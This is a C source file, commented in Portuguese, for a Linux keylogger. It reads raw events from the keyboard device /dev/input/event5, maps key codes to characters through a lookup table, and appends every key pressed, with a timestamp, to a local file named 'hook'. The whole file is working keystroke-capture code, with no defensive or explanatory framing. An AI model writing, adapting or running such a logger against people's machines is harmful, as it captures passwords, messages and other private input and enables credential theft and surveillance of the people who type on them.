#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <time.h>
#include <linux/input.h>

#define KEY_DEVICE "/dev/input/event5" // Disposítivo do teclado
#define HOOK_FILE "hook" // Arquivo onde será salva as informações

FILE *hook_file;

char *get_time(){
	time_t r_time;
	struct tm *t_info;

	time(&r_time);
	t_info = localtime(&r_time);
	return asctime(t_info);
}

char *keys_table(int key){
	switch(key){
		case 28:	return "<Enter>\n";
		case 1: 	return "<Esc>";
		case 30:	return "A";
		case 48:	return "B";
		case 46:	return "C";
		case 32:	return "D";
		case 18:	return "E";
		case 33:	return "F";
		case 34:	return "G";
		case 35:	return "H";
		case 23:	return "I";
		case 36:	return "J";
		case 37:	return "K";
		case 38:	return "L";
		case 50:	return "M";
		case 49:	return "N";
		case 24:	return "O";
		case 25:	return "P";
		case 16:	return "Q";
		case 19:	return "R";
		case 31:	return "S";
		case 20:	return "T";
		case 22:	return "U";
		case 47:	return "V";
		case 17:	return "W";
		case 45:	return "X";
		case 21:	return "Y";
		case 44:	return "Z";
		case 42:	return "<LShift>";
		case 54:	return "<RShift>";
		case 57:	return " ";
		case 2:		return "1";
		case 3:		return "2";
		case 4:		return "3";
		case 5:		return "4";
		case 6:		return "5";
		case 7:		return "6";
		case 8:		return "7";
		case 9:		return "8";
		case 10:	return "9";
		case 11:	return "0";
		case 12:	return "-";
		case 13:	return "=";
		case 41:	return "`";
		case 69:	return "<NumLock>";
		case 39:	return ";";
		case 40:	return "'";
		case 53:	return "/";
		case 52:	return ".";
		case 51:	return ",";
		case 15:	return "<Tab>";
		case 29:	return "<LCtrl>";
		case 56:	return "<Alt>";
		case 100:	return "<Alt Gr>";
		case 127:	return "<Menu>";
		case 97:	return "<RCtrl>";
		case 125:	return "<Window>";
		case 14:	return "<Backspace>";
		default:	return "";
	}
}

void signal_close(int signum){
	fprintf(hook_file,"\n");
	fclose(hook_file);

	exit(EXIT_SUCCESS);
}

int main(int argc, char **argv){
	int fd;
	struct input_event ie;
	signal(SIGINT, signal_close);

	hook_file = fopen(HOOK_FILE,"a");

	if( (fd = open(KEY_DEVICE, O_RDONLY)) == -1 ){ // Abre o arquivo para somente leitura
		perror("Não pode acessar o arquivo");
		return EXIT_FAILURE;
	}

	fprintf(hook_file,"%s", get_time());
	while(read(fd, &ie, sizeof(struct input_event))){ // le o arquivo e armazena em ie
		if(ie.type == 1 && ie.value == 1){ // Pega apenas as teclas precionadas
			fprintf(hook_file, "%s", keys_table(ie.code)); // Escreve as teclas no arquivo
		}
		printf("%i\n", ie.code);
	}

	return EXIT_SUCCESS;
}
